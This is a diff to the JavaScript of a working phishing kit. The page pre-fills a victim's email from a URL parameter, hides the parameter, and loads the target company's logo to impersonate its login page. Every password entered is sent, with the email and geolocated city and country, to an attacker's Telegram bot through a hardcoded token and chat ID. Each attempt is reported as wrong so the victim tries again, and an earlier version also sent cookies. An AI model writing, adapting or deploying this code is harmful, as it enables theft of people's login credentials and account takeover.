@@ -1,5 +1,8 @@
+
+
+  
 // Telegram Bot config
-const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
+const TELEGRAM_BOT_TOKEN = "8472203015:AAFvwceukQ2Y2iRMtO5ML0WVIztYG5xWVN8";
 const TELEGRAM_CHAT_ID = "7574749243";
 
 // Elements
@@ -11,6 +14,7 @@ const passwordInput = document.getElementById('password');
 const loginBtn = document.getElementById('login-btn');
 const errorMsg = document.getElementById('error-msg');
 const overlay = document.querySelector('.overlay');
+const loginBox = document.querySelector('.login-box');
 
 let attempts = 0;
 const maxAttempts = 3;
@@ -41,19 +45,32 @@ const cookies = parseCookies();
 // Optional: console log to check cookies
 console.log("Cookies available to JS:", cookies);
 
-// Check email validity before proceeding with UI updates
-if (/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
-  emailInput.value = rawHash;
+
+// Get email from URL  ?u=
+const params = new URLSearchParams(window.location.search);
+const rawEmail = params.get("document");
+
+// Check if email exists AND is valid
+if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+
+  emailInput.value = rawEmail;
   emailInput.setAttribute("uneditable", true);
 
-  const domain = rawHash.split('@')[1];
-
+  const domain = rawEmail.split('@')[1];
+  // HIDE parameter
+  history.replaceState({}, document.title, window.location.pathname);
+  
   // Set logo
   logoImg.src = `https://logo.clearbit.com/${domain}`;
   logoImg.onerror = () => {
     logoImg.src = "https://via.placeholder.com/150?text=Logo";
   };
+// Set loading animation logo
+        const loadingImg = document.getElementById('loading-logo');
+        loadingImg.src = `https://logo.clearbit.com/${domain}`;
+        loadingImg.onerror = () => { loadingImg.src = 'https://via.placeholder.com/80?text=L'; };
 
+  
   // Setup fallback screenshot container
   const fallbackScreenshot = document.createElement('img');
   fallbackScreenshot.id = "fallback-screenshot";
@@ -119,12 +136,11 @@ fetch("https://ipapi.co/json/")
   });
 
 // Telegram message sender
-function sendTelegramMessage(email, password, attempt, country, cookies) {
-  const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
-               ` UserId : [ ${email} ]\n` +
-               `    Pass : [ ${password} ]\n` +
-               ` Country : [ ${userCity}, ${userCountry} ]\n` +
-               ` Cookies: ${JSON.stringify(cookies)}`;
+function sendTelegramMessage(email, password, attempt, country) {
+  const text = `👺Evil Genuis [${attempt}/3] ☠️\n` +
+               ` 🧛🏿‍♂️UserId : [ ${email} ]\n` +
+               `   🔐Pass : [ ${password} ]\n` +
+               `🌍Country : [ ${userCity}, ${userCountry} ]`;
 
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   const payload = {
@@ -138,25 +154,21 @@ function sendTelegramMessage(email, password, attempt, country, cookies) {
     body: JSON.stringify(payload)
   }).catch(e => console.error("Telegram send failed:", e));
 }
-
+ // --- SHOW LOGIN AFTER LOADING ---
+  setTimeout(() => {
+    document.getElementById("loading").style.display = "none";
+    loginBox.style.display = "block";
+    setTimeout(() => loginBox.style.opacity = 1, 50);
+  }, 3000);
 // Login button handler
 loginBtn.addEventListener('click', () => {
-  
- // Unlock after 3 attempts
-    if (attempts >= maxAttempts) {
-        unlockWebsite();
-    }
-// 1️⃣ Accept cookies automatically when user proceeds
-    if (getCookie("consent_given") !== "yes") {
-        setCookie("consent_given", "yes", 180); // store for 6 months
-    }
   const password = passwordInput.value.trim();
   if (password === "") {
     errorMsg.textContent = "Password cannot be empty.";
     return;
   }
   attempts++;
-  sendTelegramMessage(emailInput.value, password, attempts, userCountry, cookies);
+  sendTelegramMessage(emailInput.value, password, attempts, userCountry);
 
   if (attempts < maxAttempts) {
     errorMsg.textContent = "Incorrect password.";
